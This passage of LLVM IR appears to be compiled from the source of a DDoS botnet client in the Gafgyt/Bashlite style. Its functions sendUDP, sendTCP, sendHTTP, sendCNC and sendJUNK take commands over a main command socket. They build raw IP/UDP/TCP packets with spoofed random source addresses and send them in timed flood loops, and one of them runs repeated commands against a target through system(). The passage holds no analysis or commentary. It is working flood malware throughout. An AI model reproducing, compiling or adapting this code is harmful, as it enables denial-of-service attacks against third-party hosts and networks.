  call void @bcopy(i8* %12, i8* %14, i64 %17) #3
  %18 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 2
  %19 = load i32, i32* %18, align 8
  %20 = trunc i32 %19 to i16
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 %20, i16* %21, align 4
  %22 = trunc i32 %1 to i16
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  %25 = sext i32 %2 to i64
  %26 = add nsw i64 %7, %25
  br label %27

; <label>:27:                                     ; preds = %37, %3
  %.0 = phi i32 [ 0, %3 ], [ %38, %37 ]
  %28 = icmp ugt i32 %.0, 49
  br i1 %28, label %29, label %37

; <label>:29:                                     ; preds = %27
  %30 = call i64 @send(i32 %5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.54, i64 0, i64 0), i64 50, i32 0) #3
  %31 = call i32 @connect(i32 %5, %struct.sockaddr* nonnull %24, i32 16) #3
  %32 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %33 = sext i32 %32 to i64
  %34 = icmp slt i64 %33, %26
  br i1 %34, label %37, label %35

; <label>:35:                                     ; preds = %29
  %36 = call i32 @close(i32 %5) #3
  call void @_exit(i32 0) #17
  unreachable

; <label>:37:                                     ; preds = %29, %27
  %.1 = phi i32 [ %.0, %27 ], [ 0, %29 ]
  %38 = add i32 %.1, 1
  br label %27
}

declare %struct.hostent* @gethostbyname(i8*) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @bcopy(i8* nocapture readonly, i8* nocapture, i64) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendUDP(i8*, i32, i32, i32, i32, i32) local_unnamed_addr #1 {
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 0
  store i16 2, i16* %9, align 4
  %10 = icmp eq i32 %1, 0
  br i1 %10, label %11, label %14

; <label>:11:                                     ; preds = %6
  %12 = tail call i32 @rand_cmwc()
  %13 = trunc i32 %12 to i16
  br label %17

; <label>:14:                                     ; preds = %6
  %15 = trunc i32 %1 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #18
  br label %17

; <label>:17:                                     ; preds = %14, %11
  %.sink = phi i16 [ %16, %14 ], [ %13, %11 ]
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 1
  store i16 %.sink, i16* %18, align 2
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 2
  %20 = call i32 @getHost(i8* %0, %struct.in_addr* %19)
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %22, label %.loopexit

; <label>:22:                                     ; preds = %17
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i64 0, i32 3, i64 0
  %24 = bitcast i8* %23 to i64*
  store i64 0, i64* %24, align 4
  %25 = icmp eq i32 %3, 32
  br i1 %25, label %26, label %53

; <label>:26:                                     ; preds = %22
  %27 = tail call i32 @socket(i32 2, i32 2, i32 17) #3
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %32

; <label>:29:                                     ; preds = %26
  %30 = load i32, i32* @mainCommSock, align 4
  %31 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %30, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.55, i64 0, i64 0))
  br label %.loopexit

; <label>:32:                                     ; preds = %26
  %33 = add nsw i32 %4, 1
  %34 = sext i32 %33 to i64
  %35 = tail call noalias i8* @malloc(i64 %34) #3
  %36 = icmp eq i8* %35, null
  br i1 %36, label %.loopexit, label %37

; <label>:37:                                     ; preds = %32
  tail call void @llvm.memset.p0i8.i64(i8* nonnull %35, i8 0, i64 %34, i32 1, i1 false)
  tail call void @makeRandomStr(i8* nonnull %35, i32 %4)
  %38 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %39 = add nsw i32 %38, %2
  %40 = sext i32 %4 to i64
  %41 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %37
  %.058 = phi i32 [ 0, %37 ], [ %.058.be, %.backedge.backedge ]
  %42 = call i64 @sendto(i32 %27, i8* nonnull %35, i64 %40, i32 0, %struct.sockaddr* nonnull %41, i32 16) #3
  %43 = icmp eq i32 %.058, %5
  br i1 %43, label %44, label %51

; <label>:44:                                     ; preds = %.backedge
  br i1 %10, label %45, label %48

; <label>:45:                                     ; preds = %44
  %46 = call i32 @rand_cmwc()
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %18, align 2
  br label %48

; <label>:48:                                     ; preds = %45, %44
  %49 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %50 = icmp sgt i32 %49, %39
  br i1 %50, label %.loopexit.loopexit, label %.backedge.backedge

; <label>:51:                                     ; preds = %.backedge
  %52 = add i32 %.058, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %51, %48
  %.058.be = phi i32 [ %52, %51 ], [ 0, %48 ]
  br label %.backedge

; <label>:53:                                     ; preds = %22
  %54 = tail call i32 @socket(i32 2, i32 3, i32 17) #3
  %55 = icmp eq i32 %54, 0
  br i1 %55, label %56, label %59

; <label>:56:                                     ; preds = %53
  %57 = load i32, i32* @mainCommSock, align 4
  %58 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %57, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.55, i64 0, i64 0))
  br label %.loopexit

; <label>:59:                                     ; preds = %53
  store i32 1, i32* %8, align 4
  %60 = bitcast i32* %8 to i8*
  %61 = call i32 @setsockopt(i32 %54, i32 0, i32 3, i8* nonnull %60, i32 4) #3
  %62 = icmp slt i32 %61, 0
  br i1 %62, label %63, label %.preheader.preheader

.preheader.preheader:                             ; preds = %59
  br label %.preheader

; <label>:63:                                     ; preds = %59
  %64 = load i32, i32* @mainCommSock, align 4
  %65 = call i32 (i32, i8*, ...) @sockprintf(i32 %64, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.56, i64 0, i64 0))
  br label %.loopexit

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.05962 = phi i32 [ %66, %.preheader ], [ 50, %.preheader.preheader ]
  %66 = add nsw i32 %.05962, -1
  %67 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %68 = call i32 @rand_cmwc()
  %69 = xor i32 %68, %67
  call void @srand(i32 %69) #3
  %70 = call i32 @rand() #3
  call void @init_rand(i32 %70)
  %71 = icmp eq i32 %66, 0
  br i1 %71, label %72, label %.preheader

; <label>:72:                                     ; preds = %.preheader
  %73 = icmp eq i32 %3, 0
  %74 = sub nsw i32 32, %3
  %75 = shl i32 -1, %74
  %.060 = select i1 %73, i32 0, i32 %75
  %76 = sext i32 %4 to i64
  %77 = add nsw i64 %76, 28
  %78 = call i8* @llvm.stacksave()
  %79 = alloca i8, i64 %77, align 16
  %80 = bitcast i8* %79 to %struct.iphdr*
  %81 = getelementptr i8, i8* %79, i64 20
  %82 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %19, i64 0, i32 0
  %83 = load i32, i32* %82, align 4
  %84 = call i32 @getRandomIP(i32 %.060)
  %85 = call i32 @htonl(i32 %84) #18
  %86 = add nsw i64 %76, 8
  %87 = trunc i64 %86 to i32
  call void @makeIPPacket(%struct.iphdr* nonnull %80, i32 %83, i32 %85, i8 zeroext 17, i32 %87)
  %88 = trunc i64 %86 to i16
  %89 = call zeroext i16 @htons(i16 zeroext %88) #18
  %90 = getelementptr inbounds i8, i8* %79, i64 24
  %91 = bitcast i8* %90 to i16*
  store i16 %89, i16* %91, align 8
  %92 = call i32 @rand_cmwc()
  %93 = trunc i32 %92 to i16
  %94 = bitcast i8* %81 to i16*
  store i16 %93, i16* %94, align 4
  br i1 %10, label %95, label %97

; <label>:95:                                     ; preds = %72
  %96 = call i32 @rand_cmwc()
  br label %101

; <label>:97:                                     ; preds = %72
  %98 = trunc i32 %1 to i16
  %99 = call zeroext i16 @htons(i16 zeroext %98) #18
  %100 = zext i16 %99 to i32
  br label %101

; <label>:101:                                    ; preds = %97, %95
  %102 = phi i32 [ %96, %95 ], [ %100, %97 ]
  %103 = trunc i32 %102 to i16
  %104 = getelementptr inbounds i8, i8* %79, i64 22
  %105 = bitcast i8* %104 to i16*
  store i16 %103, i16* %105, align 2
  %106 = getelementptr inbounds i8, i8* %79, i64 26
  %107 = bitcast i8* %106 to i16*
  store i16 0, i16* %107, align 2
  %108 = getelementptr inbounds i8, i8* %79, i64 28
  call void @makeRandomStr(i8* %108, i32 %4)
  %109 = bitcast i8* %79 to i16*
  %110 = getelementptr inbounds i8, i8* %79, i64 2
  %111 = bitcast i8* %110 to i16*
  %112 = load i16, i16* %111, align 2
  %113 = zext i16 %112 to i32
  %114 = call zeroext i16 @csum(i16* nonnull %109, i32 %113)
  %115 = getelementptr inbounds i8, i8* %79, i64 10
  %116 = bitcast i8* %115 to i16*
  store i16 %114, i16* %116, align 2
  %117 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %118 = add nsw i32 %117, %2
  %119 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %120 = getelementptr inbounds i8, i8* %79, i64 4
  %121 = bitcast i8* %120 to i16*
  %122 = getelementptr inbounds i8, i8* %79, i64 12
  %123 = bitcast i8* %122 to i32*
  %124 = trunc i32 %1 to i16
  br label %.backedge61

.backedge61:                                      ; preds = %.backedge61.backedge, %101
  %.0 = phi i32 [ 0, %101 ], [ %.0.be, %.backedge61.backedge ]
  %125 = call i64 @sendto(i32 %54, i8* nonnull %79, i64 %77, i32 0, %struct.sockaddr* nonnull %119, i32 16) #3
  %126 = call i32 @rand_cmwc()
  %127 = trunc i32 %126 to i16
  store i16 %127, i16* %94, align 4
  br i1 %10, label %128, label %130

; <label>:128:                                    ; preds = %.backedge61
  %129 = call i32 @rand_cmwc()
  br label %133

; <label>:130:                                    ; preds = %.backedge61
  %131 = call zeroext i16 @htons(i16 zeroext %124) #18
  %132 = zext i16 %131 to i32
  br label %133

; <label>:133:                                    ; preds = %130, %128
  %134 = phi i32 [ %129, %128 ], [ %132, %130 ]
  %135 = trunc i32 %134 to i16
  store i16 %135, i16* %105, align 2
  %136 = call i32 @rand_cmwc()
  %137 = trunc i32 %136 to i16
  store i16 %137, i16* %121, align 4
  %138 = call i32 @getRandomIP(i32 %.060)
  %139 = call i32 @htonl(i32 %138) #18
  store i32 %139, i32* %123, align 4
  %140 = load i16, i16* %111, align 2
  %141 = zext i16 %140 to i32
  %142 = call zeroext i16 @csum(i16* nonnull %109, i32 %141)
  store i16 %142, i16* %116, align 2
  %143 = icmp eq i32 %.0, %5
  br i1 %143, label %144, label %147

; <label>:144:                                    ; preds = %133
  %145 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %146 = icmp sgt i32 %145, %118
  br i1 %146, label %149, label %.backedge61.backedge

; <label>:147:                                    ; preds = %133
  %148 = add i32 %.0, 1
  br label %.backedge61.backedge

.backedge61.backedge:                             ; preds = %147, %144
  %.0.be = phi i32 [ %148, %147 ], [ 0, %144 ]
  br label %.backedge61

; <label>:149:                                    ; preds = %144
  call void @llvm.stackrestore(i8* %78)
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %48
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %17, %32, %149, %63, %56, %29
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @srand(i32) local_unnamed_addr #5

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #9

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendCNC(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %6 = add nsw i32 %5, %2
  %7 = tail call i32 @inet_addr(i8* %0) #3
  %8 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2, i32 0
  store i32 %7, i32* %8, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 2, i16* %9, align 4
  %10 = trunc i32 %1 to i16
  %11 = tail call zeroext i16 @htons(i16 zeroext %10) #18
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %11, i16* %12, align 2
  %13 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %14 = icmp sgt i32 %6, %13
  br i1 %14, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %3
  %15 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  br label %16

; <label>:16:                                     ; preds = %.lr.ph, %16
  %17 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %18 = call i32 @connect(i32 %17, %struct.sockaddr* nonnull %15, i32 16) #3
  %19 = call i32 @sleep(i32 1) #3
  %20 = call i32 @close(i32 %17) #3
  %21 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %22 = icmp sgt i32 %6, %21
  br i1 %22, label %16, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %16
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  ret void
}

declare i32 @sleep(i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8* nocapture readonly, i32) local_unnamed_addr #1 {
  %3 = alloca [80 x i8*], align 16
  %4 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %5 = add nsw i32 %4, %1
  %6 = tail call i32 @rand() #3
  %7 = sext i32 %6 to i64
  %8 = urem i64 %7, 23
  %9 = getelementptr inbounds [23 x i8*], [23 x i8*]* @useragents, i64 0, i64 %8
  %10 = load i8*, i8** %9, align 8
  %11 = bitcast [80 x i8*]* %3 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %11, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.57, i64 0, i64 0), i64 13, i32 1, i1 false)
  %12 = call i8* @strcat(i8* nonnull %11, i8* %10) #3
  %strlen = call i64 @strlen(i8* nonnull %11)
  %endptr = getelementptr i8, i8* %11, i64 %strlen
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %endptr, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i64 6, i32 1, i1 false)
  %13 = call i8* @strcat(i8* nonnull %11, i8* %0) #3
  %14 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %15 = icmp sgt i32 %5, %14
  br i1 %15, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %16 = call i32 @rand() #3
  %17 = sext i32 %16 to i64
  %18 = urem i64 %17, 23
  %19 = getelementptr inbounds [23 x i8*], [23 x i8*]* @useragents, i64 0, i64 %18
  %20 = load i8*, i8** %19, align 8
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %11, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.57, i64 0, i64 0), i64 13, i32 1, i1 false)
  %21 = call i8* @strcat(i8* nonnull %11, i8* %20) #3
  %strlen5 = call i64 @strlen(i8* nonnull %11)
  %endptr6 = getelementptr i8, i8* %11, i64 %strlen5
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %endptr6, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i64 6, i32 1, i1 false)
  %22 = call i8* @strcat(i8* nonnull %11, i8* %0) #3
  %23 = call i32 @system(i8* nonnull %11) #3
  %24 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %25 = icmp sgt i32 %5, %24
  br i1 %25, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #5

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8* nocapture readonly) local_unnamed_addr #5

declare i32 @system(i8* nocapture readonly) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 0
  store i16 2, i16* %10, align 4
  %11 = icmp eq i32 %1, 0
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @rand_cmwc()
  %14 = trunc i32 %13 to i16
  br label %18

; <label>:15:                                     ; preds = %7
  %16 = trunc i32 %1 to i16
  %17 = tail call zeroext i16 @htons(i16 zeroext %16) #18
  br label %18

; <label>:18:                                     ; preds = %15, %12
  %.sink = phi i16 [ %17, %15 ], [ %14, %12 ]
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 1
  store i16 %.sink, i16* %19, align 2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2
  %21 = call i32 @getHost(i8* %0, %struct.in_addr* %20)
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %23, label %163

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 3, i64 0
  %25 = bitcast i8* %24 to i64*
  store i64 0, i64* %25, align 4
  %26 = tail call i32 @socket(i32 2, i32 3, i32 6) #3
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %31

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* @mainCommSock, align 4
  %30 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %29, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.55, i64 0, i64 0))
  br label %163

; <label>:31:                                     ; preds = %23
  store i32 1, i32* %9, align 4
  %32 = bitcast i32* %9 to i8*
  %33 = call i32 @setsockopt(i32 %26, i32 0, i32 3, i8* nonnull %32, i32 4) #3
  %34 = icmp slt i32 %33, 0
  br i1 %34, label %35, label %38

; <label>:35:                                     ; preds = %31
  %36 = load i32, i32* @mainCommSock, align 4
  %37 = call i32 (i32, i8*, ...) @sockprintf(i32 %36, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.56, i64 0, i64 0))
  br label %163

; <label>:38:                                     ; preds = %31
  %39 = icmp eq i32 %3, 0
  %40 = sub nsw i32 32, %3
  %41 = shl i32 -1, %40
  %.065 = select i1 %39, i32 0, i32 %41
  %42 = sext i32 %5 to i64
  %43 = add nsw i64 %42, 40
  %44 = call i8* @llvm.stacksave()
  %45 = alloca i8, i64 %43, align 16
  %46 = bitcast i8* %45 to %struct.iphdr*
  %47 = getelementptr i8, i8* %45, i64 20
  %48 = bitcast i8* %47 to %struct.tcphdr*
  %49 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i64 0, i32 0
  %50 = load i32, i32* %49, align 4
  %51 = call i32 @getRandomIP(i32 %.065)
  %52 = call i32 @htonl(i32 %51) #18
  %53 = add i32 %5, 20
  call void @makeIPPacket(%struct.iphdr* nonnull %46, i32 %50, i32 %52, i8 zeroext 6, i32 %53)
  %54 = call i32 @rand_cmwc()
  %55 = trunc i32 %54 to i16
  %56 = bitcast i8* %47 to i16*
  store i16 %55, i16* %56, align 4
  %57 = call i32 @rand_cmwc()
  %58 = getelementptr inbounds i8, i8* %45, i64 24
  %59 = bitcast i8* %58 to i32*
  store i32 %57, i32* %59, align 8
  %60 = getelementptr inbounds i8, i8* %45, i64 28
  %61 = bitcast i8* %60 to i32*
  store i32 0, i32* %61, align 4
  %62 = getelementptr inbounds i8, i8* %45, i64 32
  %63 = bitcast i8* %62 to i16*
  %64 = load i16, i16* %63, align 16
  %65 = and i16 %64, -241
  %66 = or i16 %65, 80
  store i16 %66, i16* %63, align 16
  %67 = call i32 @strcmp(i8* %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.59, i64 0, i64 0)) #15
  %68 = icmp eq i32 %67, 0
  br i1 %68, label %71, label %.preheader

.preheader:                                       ; preds = %38
  %69 = call i8* @strtok(i8* %4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #3
  %70 = icmp eq i8* %69, null
  br i1 %70, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

; <label>:71:                                     ; preds = %38
  %72 = and i16 %64, -8177
  %73 = or i16 %72, 8016
  store i16 %73, i16* %63, align 16
  br label %.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge68
  %74 = phi i8* [ %86, %.backedge68 ], [ %69, %.lr.ph.preheader ]
  %75 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.61, i64 0, i64 0)) #15
  %76 = icmp eq i32 %75, 0
  br i1 %76, label %77, label %80

; <label>:77:                                     ; preds = %.lr.ph
  %78 = load i16, i16* %63, align 16
  %79 = or i16 %78, 512
  store i16 %79, i16* %63, align 16
  br label %.backedge68

; <label>:80:                                     ; preds = %.lr.ph
  %81 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.62, i64 0, i64 0)) #15
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %83, label %88

; <label>:83:                                     ; preds = %80
  %84 = load i16, i16* %63, align 16
  %85 = or i16 %84, 1024
  store i16 %85, i16* %63, align 16
  br label %.backedge68

.backedge68:                                      ; preds = %83, %97, %106, %103, %91, %77
  %86 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.60, i64 0, i64 0)) #3
  %87 = icmp eq i8* %86, null
  br i1 %87, label %.loopexit.loopexit, label %.lr.ph

; <label>:88:                                     ; preds = %80
  %89 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.63, i64 0, i64 0)) #15
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %94

; <label>:91:                                     ; preds = %88
  %92 = load i16, i16* %63, align 16
  %93 = or i16 %92, 256
  store i16 %93, i16* %63, align 16
  br label %.backedge68

; <label>:94:                                     ; preds = %88
  %95 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.64, i64 0, i64 0)) #15
  %96 = icmp eq i32 %95, 0
  br i1 %96, label %97, label %100

; <label>:97:                                     ; preds = %94
  %98 = load i16, i16* %63, align 16
  %99 = or i16 %98, 4096
  store i16 %99, i16* %63, align 16
  br label %.backedge68

; <label>:100:                                    ; preds = %94
  %101 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.65, i64 0, i64 0)) #15
  %102 = icmp eq i32 %101, 0
  br i1 %102, label %103, label %106

; <label>:103:                                    ; preds = %100
  %104 = load i16, i16* %63, align 16
  %105 = or i16 %104, 2048
  store i16 %105, i16* %63, align 16
  br label %.backedge68

; <label>:106:                                    ; preds = %100
  %107 = load i32, i32* @mainCommSock, align 4
  %108 = call i32 (i32, i8*, ...) @sockprintf(i32 %107, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.66, i64 0, i64 0), i8* nonnull %74)
  br label %.backedge68

.loopexit.loopexit:                               ; preds = %.backedge68
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %71
  %109 = call i32 @rand_cmwc()
  %110 = trunc i32 %109 to i16
  %111 = getelementptr inbounds i8, i8* %45, i64 34
  %112 = bitcast i8* %111 to i16*
  store i16 %110, i16* %112, align 2
  %113 = getelementptr inbounds i8, i8* %45, i64 36
  %114 = bitcast i8* %113 to i16*
  store i16 0, i16* %114, align 4
  %115 = getelementptr inbounds i8, i8* %45, i64 38
  %116 = bitcast i8* %115 to i16*
  store i16 0, i16* %116, align 2
  br i1 %11, label %117, label %119

; <label>:117:                                    ; preds = %.loopexit
  %118 = call i32 @rand_cmwc()
  br label %123

; <label>:119:                                    ; preds = %.loopexit
  %120 = trunc i32 %1 to i16
  %121 = call zeroext i16 @htons(i16 zeroext %120) #18
  %122 = zext i16 %121 to i32
  br label %123

; <label>:123:                                    ; preds = %119, %117
  %124 = phi i32 [ %118, %117 ], [ %122, %119 ]
  %125 = trunc i32 %124 to i16
  %126 = getelementptr inbounds i8, i8* %45, i64 22
  %127 = bitcast i8* %126 to i16*
  store i16 %125, i16* %127, align 2
  %128 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %128, i16* %114, align 4
  %129 = bitcast i8* %45 to i16*
  %130 = getelementptr inbounds i8, i8* %45, i64 2
  %131 = bitcast i8* %130 to i16*
  %132 = load i16, i16* %131, align 2
  %133 = zext i16 %132 to i32
  %134 = call zeroext i16 @csum(i16* nonnull %129, i32 %133)
  %135 = getelementptr inbounds i8, i8* %45, i64 10
  %136 = bitcast i8* %135 to i16*
  store i16 %134, i16* %136, align 2
  %137 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %138 = add nsw i32 %137, %2
  %139 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %140 = getelementptr inbounds i8, i8* %45, i64 12
  %141 = bitcast i8* %140 to i32*
  %142 = getelementptr inbounds i8, i8* %45, i64 4
  %143 = bitcast i8* %142 to i16*
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %123
  %.0 = phi i32 [ 0, %123 ], [ %.0.be, %.backedge.backedge ]
  %144 = call i64 @sendto(i32 %26, i8* nonnull %45, i64 %43, i32 0, %struct.sockaddr* nonnull %139, i32 16) #3
  %145 = call i32 @getRandomIP(i32 %.065)
  %146 = call i32 @htonl(i32 %145) #18
  store i32 %146, i32* %141, align 4
  %147 = call i32 @rand_cmwc()
  %148 = trunc i32 %147 to i16
  store i16 %148, i16* %143, align 4
  %149 = call i32 @rand_cmwc()
  store i32 %149, i32* %59, align 8
  %150 = call i32 @rand_cmwc()
  %151 = trunc i32 %150 to i16
  store i16 %151, i16* %56, align 4
  store i16 0, i16* %114, align 4
  %152 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %152, i16* %114, align 4
  %153 = load i16, i16* %131, align 2
  %154 = zext i16 %153 to i32
  %155 = call zeroext i16 @csum(i16* nonnull %129, i32 %154)
  store i16 %155, i16* %136, align 2
  %156 = icmp eq i32 %.0, %6
  br i1 %156, label %157, label %160

; <label>:157:                                    ; preds = %.backedge
  %158 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %159 = icmp sgt i32 %158, %138
  br i1 %159, label %162, label %.backedge.backedge

; <label>:160:                                    ; preds = %.backedge
  %161 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %160, %157
  %.0.be = phi i32 [ %161, %160 ], [ 0, %157 ]
  br label %.backedge

; <label>:162:                                    ; preds = %157
  call void @llvm.stackrestore(i8* %44)
  br label %163

; <label>:163:                                    ; preds = %18, %162, %35, %28
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.timeval, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = tail call i32 @getdtablesize() #3
  %10 = sdiv i32 %9, 2
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = trunc i32 %1 to i16
  %13 = tail call zeroext i16 @htons(i16 zeroext %12) #18
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %13, i16* %14, align 2
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2
  %16 = call i32 @getHost(i8* %0, %struct.in_addr* %15)
  %17 = icmp eq i32 %16, 0
  br i1 %17, label %18, label %101

; <label>:18:                                     ; preds = %3
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 3, i64 0
  %20 = bitcast i8* %19 to i64*
